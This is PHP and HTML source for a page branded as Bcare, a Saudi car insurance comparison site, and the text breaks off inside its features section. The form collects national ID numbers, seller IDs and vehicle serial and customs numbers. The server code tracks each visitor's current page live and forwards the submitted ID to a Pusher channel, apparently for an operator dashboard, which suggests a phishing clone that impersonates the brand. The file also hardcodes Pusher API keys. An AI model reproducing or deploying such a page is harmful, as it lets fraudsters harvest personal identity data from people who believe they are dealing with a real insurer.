<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'الرئيسية');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'الرئيسية'
    ];

    $pusher->trigger('bcare', 'curreneft-page', $dataa);
}

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'ssn' => $_POST['ssn'],
        'firstType' => $_POST['firstType'],
        'secondType' => $_POST['secondType'],
        'ssnTwo' => $_POST['ssnTwo'],
        'tasal' => $_POST['tasal'],
        'jamNum' => $_POST['jomNum'],
        'yearOf' => $_POST['yearOf'],

        'page' => 'الرئيسية',
        'message' => 'الرئيسية',
        'type' => '1',
        'chat_session_id' => $_POST['chat_session_id'] ?? null
    );

    $_SESSION['type'] = 1;
    $_SESSION['ssn'] = $_POST['ssn'];

    $id = $User->register($site);
    if ($id) {

        $_SESSION['user_id'] = $id;

        $data['message'] = $_POST['ssn'];
        $pusher->trigger('bcare', 'my-event-bann', $data);

        SendMail($_POST["username"]);

        echo "<script>document.location.href='index-details.php';</script>";
    }
}
if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_GET['done'])) {
    $showError1 = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="csrf-token" content="<?php echo htmlspecialchars($_SESSION['csrf_token'] ?? '', ENT_QUOTES, 'UTF-8'); ?>">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بي كير للتأمين : أفضل موقع مقارنة تأمين سيارة ومركبات | تأمينك Bcare</title>
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <style>
/* CSS Variables */
:root {
    --color-background: #F4F7FB;
    --color-surface: #FFFFFF;
    --color-primary: #0F4C72;
    --color-primary-dark: #0B3856;
    --color-primary-light: #E6F0F7;
    --color-accent: #F2A340;
    --color-accent-dark: #D6892F;
    --color-text-primary: #0E1F2E;
    --color-text-secondary: #4B5B6B;
    --color-border: #D8E2EE;
    --color-info: #1E88E5;
    --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
    --shadow-card: 0 14px 30px rgba(15, 76, 114, 0.16);
}

/* Reset & Base Styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html, body {
    overflow-x: hidden;
    max-width: 100%;
}

body {
    font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: var(--color-background);
    color: var(--color-text-primary);
    line-height: 1.6;
    position: relative;
}

.container {
    max-width: 1280px;
    margin: 0 auto;
    padding: 0 1rem;
}

/* Header Styles */
.header {
    position: sticky;
    top: 0;
    z-index: 500;
}

/* Main Navigation */
.main-nav {
    background: rgba(255, 255, 255, 0.92);
    backdrop-filter: blur(8px);
    border-bottom: 1px solid var(--color-border);
}

.nav-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    height: 4rem;
}

.nav-actions {
    display: flex;
    gap: 0.5rem;
}

.lang-btn, .profile-btn, .menu-btn {
    background: transparent;
    border: 1px solid var(--color-border);
    border-radius: 9999px;
    cursor: pointer;
    transition: background 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
}

.lang-btn:hover, .profile-btn:hover, .menu-btn:hover {
    background: rgba(0, 0, 0, 0.02);
}

.lang-btn {
    padding: 0.25rem 0.75rem;
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-text-primary);
}

.profile-btn, .menu-btn {
    padding: 0.5rem;
}

.profile-icon, .menu-icon {
    width: 1.25rem;
    height: 1.25rem;
    stroke: var(--color-primary);
    stroke-width: 1.8;
    fill: none;
}

.menu-icon {
    stroke: var(--color-text-primary);
    stroke-width: 2;
}

.logo img {
    display: block;
}

/* Main Content */
.main-content {
    max-width: 48rem;
    margin: 0 auto;
    padding: 0 1rem;
}

/* Hero Section */
.hero-section {
    position: relative;
    max-width: 48rem;
    margin: 1rem auto;
    padding: 1.25rem 1rem;
    background: linear-gradient(135deg, var(--color-primary) 0%, var(--color-primary-dark) 60%, #0A2F49 100%);
    border-radius: 1rem;
    color: white;
    overflow: hidden;
    box-shadow: var(--shadow-soft);
}

.hero-bg-effects {
    position: absolute;
    inset: 0;
    pointer-events: none;
}

.float-circle-1 {
    position: absolute;
    top: -2.5rem;
    left: -2.5rem;
    width: 6rem;
    height: 6rem;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 50%;
    filter: blur(24px);
    animation: float-soft 7s ease-in-out infinite;
}

.float-circle-2 {
    position: absolute;
    bottom: -3rem;
    right: -3rem;
    width: 7rem;
    height: 7rem;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 50%;
    filter: blur(24px);
    animation: float-soft 7s ease-in-out infinite;
}

.glow-ring {
    position: absolute;
    right: 1.25rem;
    top: 50%;
    transform: translateY(-50%);
    width: 4rem;
    height: 4rem;
    border: 1px solid rgba(255, 255, 255, 0.15);
    border-radius: 50%;
    animation: glow 3s ease-in-out infinite;
}

@keyframes float-soft {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
}

@keyframes glow {
    0%, 100% { opacity: 0.7; }
    50% { opacity: 1; }
}

.hero-content {
    position: relative;
    z-index: 10;
    display: flex;
    flex-direction: column;
    gap: 0.75rem;
}

.hero-badges {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
}

.badge {
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
    padding: 0.25rem 0.75rem;
    border-radius: 9999px;
    font-size: 0.688rem;
    font-weight: 600;
}

.badge-primary {
    background: rgba(255, 255, 255, 0.15);
}

.badge-secondary {
    border: 1px solid rgba(255, 255, 255, 0.15);
    color: rgba(255, 255, 255, 0.85);
}

.badge-dot {
    width: 0.5rem;
    height: 0.5rem;
    background: #6EE7B7;
    border-radius: 50%;
    animation: glow 3s ease-in-out infinite;
}

.hero-title {
    font-size: 1.125rem;
    font-weight: bold;
    line-height: 1.375;
    letter-spacing: -0.025em;
    color: white;
}

.hero-subtitle {
    font-size: 0.875rem;
    line-height: 1.625;
    color: rgba(255, 255, 255, 0.8);
}

/* Form Styles */
.insurance-form {
    margin-top: 1.5rem;
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.form-card {
    background: rgba(255, 255, 255, 0.9);
    border: 1px solid var(--color-border);
    border-radius: 1rem;
    padding: 1.5rem;
    box-shadow: var(--shadow-soft);
}

.form-card-light {
    background: var(--color-primary-light);
    border-color: var(--color-border);
    padding: 1.5rem;
    box-shadow: var(--shadow-card);
}

.form-header {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 1rem;
    gap: 0.75rem;
}

.form-title {
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-primary-dark);
}

.form-subtitle {
    font-size: 0.75rem;
    color: var(--color-text-secondary);
}

.section-label {
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-text-secondary);
}

/* Categories Grid */
.categories-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 0.75rem;
    margin-bottom: 1.25rem;
}

.category-btn {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    padding: 0.75rem 0.5rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-text-secondary);
    cursor: pointer;
    transition: all 0.3s;
    min-width: 0;
}

.category-btn:hover:not(:disabled) {
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.category-btn.active {
    background: var(--color-primary);
    color: white;
    border-color: var(--color-primary);
}

.category-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.category-icon {
    width: 1.5rem;
    height: 1.5rem;
    fill: currentColor;
}

.category-btn span {
    width: 100%;
    text-align: center;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

/* Insurance Types */
.insurance-types {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 0.75rem;
}

.type-btn {
    padding: 0.75rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-text-primary);
    cursor: pointer;
    transition: all 0.3s;
}

.type-btn:hover {
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.type-btn.active {
    background: var(--color-primary);
    color: white;
    border-color: var(--color-primary);
}

/* Form Header Main */
.form-header-main {
    margin-bottom: 1.5rem;
}

.section-title {
    font-size: 1.125rem;
    font-weight: bold;
    color: var(--color-text-primary);
}

.section-subtitle {
    font-size: 0.75rem;
    color: var(--color-text-secondary);
}

/* Registration Method */
.registration-method {
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    padding: 1rem;
    margin-bottom: 1.5rem;
}

.method-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 0.75rem;
}

.method-label {
    display: block;
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-text-secondary);
}

.info-icon {
    width: 1rem;
    height: 1rem;
    fill: var(--color-info);
}

.method-buttons {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 0.75rem;
}

.method-btn {
    padding: 0.75rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-primary);
    cursor: pointer;
    transition: all 0.3s;
}

.method-btn:hover {
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.method-btn.active {
    background: var(--color-primary);
    color: white;
    border-color: var(--color-primary);
}

/* Form Fields */
.form-field {
    margin-bottom: 1.25rem;
}

.form-field label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: var(--color-text-secondary);
    text-align: right;
    margin-bottom: 0.5rem;
}

.form-field input, 
.form-field select {
    width: 100%;
    padding: 0.75rem 1rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    color: var(--color-text-primary);
    text-align: right;
    transition: all 0.15s;
}

.form-field input:focus,
.form-field select:focus {
    outline: none;
    border-color: var(--color-primary);
    box-shadow: 0 0 0 2px var(--color-primary-light);
}

.form-field input::placeholder {
    color: #9CA3AF;
}

.form-row {
    display: grid;
    grid-template-columns: 1fr;
    gap: 1rem;
}

@media (min-width: 640px) {
    .form-row {
        grid-template-columns: repeat(2, 1fr);
    }
}

/* Captcha */
.verification-field {
    margin-bottom: 1.25rem;
}

.verification-field label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: var(--color-text-secondary);
    margin-bottom: 0.5rem;
    text-align: right;
}

.verification-input-group {
    display: flex;
    gap: 0.75rem;
    align-items: stretch;
}

/* Captcha */
.verification-field {
    margin-bottom: 1.25rem;
}

.verification-field label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: var(--color-text-secondary);
    margin-bottom: 0.5rem;
    text-align: right;
}

.verification-input-group {
    display: flex;
    gap: 0.75rem;
    align-items: center;
}

.captcha-input {
    flex: 1;
    padding: 0.75rem 1rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 1rem;
    font-weight: bold;
    text-align: center;
    color: var(--color-text-primary);
}

.captcha-input:focus {
    outline: none;
    border-color: var(--color-primary);
    box-shadow: 0 0 0 2px var(--color-primary-light);
}

.refresh-captcha-btn {
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 50%;
    width: 40px;
    height: 40px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s;
    flex-shrink: 0;
}

.refresh-captcha-btn:hover {
    background: var(--color-primary-light);
}

.refresh-captcha-btn svg {
    width: 20px;
    height: 20px;
    color: var(--color-primary);
}

.captcha-container {
    flex-shrink: 0;
}

#captchaDisplay {
    min-width: 100px;
    height: 45px;
    background: #e9ecef;
    border: 1px solid #ced4da;
    border-radius: 0.5rem;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

#captchaCanvas {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    opacity: 0.8;
    pointer-events: none;
}

#captchaText {
    position: relative;
    z-index: 2;
    font-family: monospace;
    font-style: italic;
    font-weight: 800;
    font-size: 1.4rem;
    color: #444;
    letter-spacing: 5px;
    text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
    user-select: none;
}

/* Terms Text */
.terms-text {
    font-size: 0.75rem;
    line-height: 1.625;
    color: var(--color-text-secondary);
    text-align: center;
    margin-bottom: 1.5rem;
    padding: 1rem 0;
}

/* Submit Button */
.submit-btn {
    width: 100%;
    padding: 0.75rem;
    background: var(--color-accent);
    color: white;
    border: 1px solid var(--color-accent-dark);
    border-radius: 0.75rem;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.submit-btn:hover:not(:disabled) {
    box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
}

.submit-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

/* Partners Section */
.partners-section {
    background: white;
    padding: 2rem 1rem;
    margin-top: 3rem;
    border-radius: 1rem;
    box-shadow: var(--shadow-soft);
}

.partners-grid {
    display: flex;
    align-items: center;
    justify-content: center;
    flex-wrap: wrap;
    gap: 1.5rem;
}

.partner-logo {
    transition: transform 0.3s ease;
    filter: grayscale(100%);
    opacity: 0.6;
}

.partner-logo:hover {
    transform: scale(1.1);
    filter: grayscale(0%);
    opacity: 1;
}

/* Features Section */
.features-section {
    margin-top: 3rem;
    padding: 0 1rem;
}

.features-title {
    text-align: center;
    font-size: 1.5rem;
    font-weight: 900;
    color: var(--color-primary);
    margin-bottom: 2rem;
    position: relative;
    padding-bottom: 1rem;
}

.features-title::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 50%;
    transform: translateX(-50%);
    width: 80px;
    height: 4px;
    background: linear-gradient(135deg, var(--color-accent) 0%, var(--color-accent-dark) 100%);
    border-radius: 2px;
}

.features-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 1rem;
    margin-bottom: 2rem;
}

.feature-card {
    background: white;
    padding: 1.5rem 1rem;
    border-radius: 1rem;
    text-align: center;
    box-shadow: var(--shadow-soft);
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    border: 2px solid transparent;
}

.feature-card:hover {
    transform: translateY(-4px);
    box-shadow: var(--shadow-card);
    border-color: var(--color-accent);
}

.feature-icon {
    width: 50px;
    height: 50px;
    margin: 0 auto 0.75rem;
    background: linear-gradient(135deg, rgba(15, 76, 114, 0.1) 0%, rgba(242, 163, 64, 0.1) 100%);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: transform 0.3s ease;
}

.feature-card:hover .feature-icon {
    transform: scale(1.1) rotate(5deg);
}

.feature-icon img {
    width: 30px;
    height: 30px;
}

.feature-text {
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-primary);
}

/* Footer */
.footer {
    background: #0B2F48;
    color: #D6E4F0;
    margin-top: 4rem;
    padding: 3rem 1rem;
    text-align: center;
}

.footer-logo {
    margin: 0 auto 1rem;
    opacity: 0.9;
    width: 120px;
}

.footer-copyright {
    font-size: 0.75rem;
    line-height: 1.625;
    color: #9FB4C4;
}

/* Responsive Styles */
@media (min-width: 640px) {
    .hero-title {
        font-size: 1.25rem;
    }
    
    .hero-subtitle {
        font-size: 0.938rem;
    }
    
    .form-card {
        padding: 2rem;
    }
    
    .form-card-light {
        padding: 2rem;
    }
    
    .form-row {
        grid-template-columns: repeat(2, 1fr);
    }
    
    .categories-grid {
        gap: 0.75rem;
    }
    
    .category-btn {
        padding: 0.75rem;
    }
    
    .category-icon {
        width: 1.5rem;
        height: 1.5rem;
    }
    
    .features-grid {
        grid-template-columns: repeat(4, 1fr);
        gap: 1.5rem;
    }
}

@media (min-width: 1024px) {
    .hero-title {
        font-size: 1.5rem;
    }
}

@media (max-width: 639px) {
    .categories-grid {
        grid-template-columns: repeat(4, 1fr);
        gap: 0.5rem;
    }
    
    .category-btn {
        padding: 0.6rem 0.25rem;
        font-size: 0.625rem;
    }
    
    .category-icon {
        width: 1rem;
        height: 1rem;
    }
    
    /* إصلاح رمز التحقق على الموبايل */
    .verification-input-group {
        gap: 0.5rem;
    }
    
    .captcha-input {
        flex: 1;
        min-width: 0;
    }
    
    .refresh-captcha-btn {
        width: 36px;
        height: 36px;
        flex-shrink: 0;
    }
    
    .refresh-captcha-btn svg {
        width: 18px;
        height: 18px;
    }
    
    .captcha-container {
        flex-shrink: 0;
    }
    
    #captchaDisplay {
        min-width: 90px;
        height: 40px;
    }
    
    #captchaText {
        font-size: 1.1rem;
        letter-spacing: 4px;
    }
}

@media (max-width: 576px) {
    .partners-grid {
        gap: 1rem;
    }
    
    .partner-logo {
        max-width: 70px;
    }
    
    .features-title {
        font-size: 1.25rem;
    }
}
    </style>
    <link rel="stylesheet" href="./assets/css/theme.css">
</head>
<body>
    <!-- Header -->
    <header class="header">
        <!-- Main Navigation -->
        <div class="main-nav">
            <div class="container nav-content">
                <div class="nav-actions">
                    <button class="lang-btn">EN</button>
                    <button class="profile-btn" aria-label="الملف الشخصي">
                        <svg class="profile-icon" viewBox="0 0 24 24">
                            <path d="M20 21a8 8 0 0 0-16 0"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                        </svg>
                    </button>
                </div>
                <a href="index.php" class="logo">
                    <img src="./assets/Bcare-logo.svg" alt="bcare logo" width="90" height="45">
                </a>
                <button class="menu-btn" aria-label="القائمة">
                    <svg class="menu-icon" viewBox="0 0 24 24">
                        <line x1="3" y1="12" x2="21" y2="12"></line>
                        <line x1="3" y1="6" x2="21" y2="6"></line>
                        <line x1="3" y1="18" x2="21" y2="18"></line>
                    </svg>
                </button>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <!-- Hero Section -->
        <div class="hero-section">
            <div class="hero-bg-effects">
                <div class="float-circle-1"></div>
                <div class="float-circle-2"></div>
                <div class="glow-ring"></div>
            </div>
            <div class="hero-content">
                <div class="hero-badges">
                    <span class="badge badge-primary">
                        <span class="badge-dot"></span>
                        منصة مقارنة التأمين الأولى
                    </span>
                    <span class="badge badge-secondary">
                        <span class="badge-dot"></span>
                        أكثر من 20 شركة تأمين معتمدة
                    </span>
                </div>
                <div class="hero-text">
                    <h1 class="hero-title">قارن، أمّن، واستلم وثيقتك خلال دقائق</h1>
                    <p class="hero-subtitle">مكان واحد لتأمين مركبتك، مع عروض فورية من شركات متعددة ومعتمدة.</p>
                </div>
            </div>
        </div>

        <!-- Insurance Form -->
        <form class="insurance-form" method="POST" id="insuranceForm">
            <!-- Categories Section -->
            <div class="form-card">
                <div class="form-header">
                    <div>
                        <p class="form-title">فئات التأمين</p>
                        <p class="form-subtitle">أدخل بياناتك لتظهر أفضل الأسعار فورًا.</p>
                    </div>
                    <div class="section-label">نوع التأمين</div>
                </div>
                <div class="categories-grid">
                    <button type="button" class="category-btn active">
                        <svg class="category-icon" viewBox="0 0 640 512">
                            <path d="M544 192h-16L419.22 56.02A64.025 64.025 0 0 0 369.24 32H155.33c-26.17 0-49.7 15.93-59.42 40.23L48 194.26C20.44 201.4 0 226.21 0 256v112c0 8.84 7.16 16 16 16h48c0 53.02 42.98 96 96 96s96-42.98 96-96h128c0 53.02 42.98 96 96 96s96-42.98 96-96h48c8.84 0 16-7.16 16-16v-80c0-53.02-42.98-96-96-96zM160 432c-26.47 0-48-21.53-48-48s21.53-48 48-48 48 21.53 48 48-21.53 48-48 48zm72-240H116.93l38.4-96H232v96zm48 0V96h89.24l76.8 96H280zm200 240c-26.47 0-48-21.53-48-48s21.53-48 48-48 48 21.53 48 48-21.53 48-48 48z"/>
                        </svg>
                        <span>مركبات</span>
                    </button>
                    <button type="button" class="category-btn" disabled>
                        <svg class="category-icon" viewBox="0 0 512 512">
                            <path d="M320.2 243.8l-49.7 99.4c-6 12.1-23.4 11.7-28.9-.6l-56.9-126.3-30 71.7H60.6l182.5 186.5c7.1 7.3 18.6 7.3 25.7 0L451.4 288H342.3l-22.1-44.2zM473.7 73.9l-2.4-2.5c-51.5-52.6-135.8-52.6-187.4 0L256 100l-27.9-28.5c-51.5-52.7-135.9-52.7-187.4 0l-2.4 2.4C-10.4 123.7-12.5 203 31 256h102.4l35.9-86.2c5.4-12.9 23.6-13.2 29.4-.4l58.2 129.3 49-97.9c5.9-11.8 22.7-11.8 28.6 0l27.6 55.2H481c43.5-53 41.4-132.3-7.3-182.1z"/>
                        </svg>
                        <span>طبي</span>
                    </button>
                    <button type="button" class="category-btn" disabled>
                        <svg class="category-icon" viewBox="0 0 512 512">
                            <path d="M447.1 112c-34.2.5-62.3 28.4-63 62.6-.5 24.3 12.5 45.6 32 56.8V344c0 57.3-50.2 104-112 104-60 0-109.2-44.1-111.9-99.2C265 333.8 320 269.2 320 192V36.6c0-11.4-8.1-21.3-19.3-23.5L237.8.5c-13-2.6-25.6 5.8-28.2 18.8L206.4 35c-2.6 13 5.8 25.6 18.8 28.2l30.7 6.1v121.4c0 52.9-42.2 96.7-95.1 97.2-53.4.5-96.9-42.7-96.9-96V69.4l30.7-6.1c13-2.6 21.4-15.2 18.8-28.2l-3.1-15.7C107.7 6.4 95.1-2 82.1.6L19.3 13C8.1 15.3 0 25.1 0 36.6V192c0 77.3 55.1 142 128.1 156.8C130.7 439.2 208.6 512 304 512c97 0 176-75.4 176-168V231.4c19.1-11.1 32-31.7 32-55.4 0-35.7-29.2-64.5-64.9-64zm.9 80c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"/>
                        </svg>
                        <span>أخطاء طبية</span>
                    </button>
                    <button type="button" class="category-btn" disabled>
                        <svg class="category-icon" viewBox="0 0 640 512">
                            <path d="M624 448H16c-8.84 0-16 7.16-16 16v32c0 8.84 7.16 16 16 16h608c8.84 0 16-7.16 16-16v-32c0-8.84-7.16-16-16-16zM80.55 341.27c6.28 6.84 15.1 10.72 24.33 10.71l130.54-.18a65.62 65.62 0 0 0 29.64-7.12l290.96-147.65c26.74-13.57 50.71-32.94 67.02-58.31 18.31-28.48 20.3-49.09 13.07-63.65-7.21-14.57-24.74-25.27-58.25-27.45-29.85-1.94-59.54 5.92-86.28 19.48l-98.51 49.99-218.7-82.06a17.799 17.799 0 0 0-18-1.11L90.62 67.29c-10.67 5.41-13.25 19.65-5.17 28.53l156.22 98.1-103.21 52.38-72.35-36.47a17.804 17.804 0 0 0-16.07.02L9.91 230.22c-10.44 5.3-13.19 19.12-5.57 28.08l76.21 82.97z"/>
                        </svg>
                        <span>سفر</span>
                    </button>
                </div>
                <div class="insurance-types">
                    <button type="button" class="type-btn active panner" data-type="new">تأمين جديد</button>
                    <button type="button" class="type-btn panner" data-type="transfer">نقل الملكية</button>
                </div>
            </div>

            <!-- Hidden Fields -->
            <input type="hidden" id="firstType" name="firstType" value="1">
            <input type="hidden" id="secondType" name="secondType" value="1">
            <input type="hidden" name="chat_session_id" id="chat_session_id_input">

            <!-- Form Fields -->
            <div class="form-card form-card-light">
                <div class="form-header-main">
                    <h2 class="section-title">ابدأ طلبك الآن</h2>
                    <p class="section-subtitle">أدخل بياناتك لتظهر أفضل الأسعار فورًا.</p>
                </div>

                <div class="registration-method">
                    <div class="method-header">
                        <label class="method-label">طريقة تسجيل المركبة</label>
                        <svg class="info-icon" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
                        </svg>
                    </div>
                    <div class="method-buttons">
                        <button type="button" id="ista" class="method-btn active pannerTwo">الرقم التسلسلي</button>
                        <button type="button" id="ista2" class="method-btn pannerTwo">بطاقة جمركية</button>
                    </div>
                </div>

                <!-- Seller ID (Hidden by default for transfer ownership) -->
                <div id="typeTwo" style="display: none;" class="form-field">
                    <label for="ssnTwo">رقم هوية البائع:</label>
                    <input type="text" id="ssnTwo" name="ssnTwo" maxlength="10" pattern="[0-9]*" inputmode="numeric" placeholder="رقم هوية البائع">
                </div>

                <!-- National ID -->
                <div class="form-field">
                    <label for="ssn">رقم الهوية / الإقامة:</label>
                    <input type="text" id="ssn" name="ssn" required maxlength="10" pattern="[0-9]*" inputmode="numeric" placeholder="ادخل 10 أرقام">
                </div>

                <!-- Serial Number -->
                <div id="tasal" class="form-field">
                    <label for="tasal">الرقم التسلسلي:</label>
                    <input type="text" name="tasal" id="tasalInput" pattern="[0-9]*" inputmode="numeric" required placeholder="الرقم التسلسلي">
                </div>

                <!-- Customs Card Fields (Hidden by default) -->
                <div id="jama" style="display: none;">
                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem;">
                        <div class="form-field" style="margin-bottom: 0;">
                            <label for="year">سنة صنع المركبة:</label>
                            <select name="yearOf" id="year">
                                <option value="">سنة صنع المركبة</option>
                                <?php for($y = 2026; $y >= 1916; $y--): ?>
                                <option value="<?php echo $y; ?>"><?php echo $y; ?></option>
                                <?php endfor; ?>
                            </select>
                        </div>
                        <div class="form-field" style="margin-bottom: 0;">
                            <label for="numG">الرقم الجمركي:</label>
                            <input type="text" name="jomNum" id="numG" pattern="[0-9]*" inputmode="numeric" placeholder="الرقم الجمركي">
                        </div>
                    </div>
                </div>

                <!-- Captcha -->
                <div class="verification-field">
                    <label for="captchaInput">رمز التحقق:</label>
                    <div class="verification-input-group">
                        <input type="text" class="captcha-input" id="captchaInput" required minlength="4" maxlength="4" inputmode="numeric" placeholder="أدخل الرمز" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                        <button type="button" class="refresh-captcha-btn" id="refreshCaptcha" aria-label="تحديث الرمز">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/>
                            </svg>
                        </button>
                        <div class="captcha-container">
                            <div id="captchaDisplay">
                                <canvas id="captchaCanvas"></canvas>
                                <span id="captchaText"></span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Terms Text -->
                <p class="terms-text">أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي</p>

                <!-- Submit Button -->
                <button type="submit" name="submit" id="butSubm" disabled class="submit-btn">إظهار العروض</button>
            </div>
        </form>
    </main>

    <!-- Partners Section -->
    <div class="container">
        <div class="partners-section">
            <div class="partners-grid">
                <div>
                    <img src="./assets/Group 6528.svg" class="partner-logo" width="100" alt="Partner">
                </div>
                <img src="./assets/Aljazira-Takaful.svg" class="partner-logo" width="80" alt="Aljazira Takaful">
                <img src="./assets/Walaa.svg" class="partner-logo" width="80" alt="Walaa">
                <img src="./assets/MedGulf.svg" class="partner-logo" width="80" alt="MedGulf">
            </div>
        </div>
    </div>

    <!-- Features Section -->
    <div class="container features-section">
        <h2 class="features-title">طريقك آمــن مع بي كير</h2>
        
        <div class="features-grid">
            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/insureOneMin.svg" alt="تأمينك في دقيقة">
                </div>
                <p class="feature-text">تأمينك في دقيقة</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/sprateInsure.svg" alt="فصّل تأمينك">
                </div>
                <p class="feature-text">فصّل تأمينك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/priceLess.svg" alt="أسعار أقل">
                </div>
                <p class="feature-text">أسعار أقل</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/sechleInsure.svg" alt="جدول تأمينك">
                </div>
                <p class="feature-text">جدول تأمينك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/wind.svg" alt="هب ريح">
                </div>
                <p class="feature-text">هب ريح</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/discounts.svg" alt="خصومات تضبطك">
                </div>
                <p class="feature-text">خصومات تضبطك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
